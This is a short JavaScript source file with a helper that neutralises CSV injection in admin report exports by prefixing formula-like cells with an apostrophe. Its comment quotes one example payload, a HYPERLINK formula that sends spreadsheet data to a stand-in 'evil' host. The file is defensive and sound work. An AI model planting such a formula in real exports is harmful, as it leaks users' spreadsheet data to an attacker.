// CSV cells for the Admin report exports.
//
// Report cells include text other people typed — supplier company names,
// procurement titles. Excel and Google Sheets run a cell beginning with
// = + - @ (or a tab / carriage return before one) as a FORMULA, so a supplier
// registering as  =HYPERLINK("http://evil/?"&A1,"Click")  would plant a live
// formula in the Admin's spreadsheet ("CSV injection"). Such cells are
// prefixed with an apostrophe, which spreadsheets show as plain text.

const FORMULA_START = /^[=+\-@\t\r]/

/** One CSV cell: formula-neutralised, then quoted when it needs to be. */
export function csvCell(value) {
  let s = String(value ?? '')
  if (FORMULA_START.test(s)) s = `'${s}`
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}
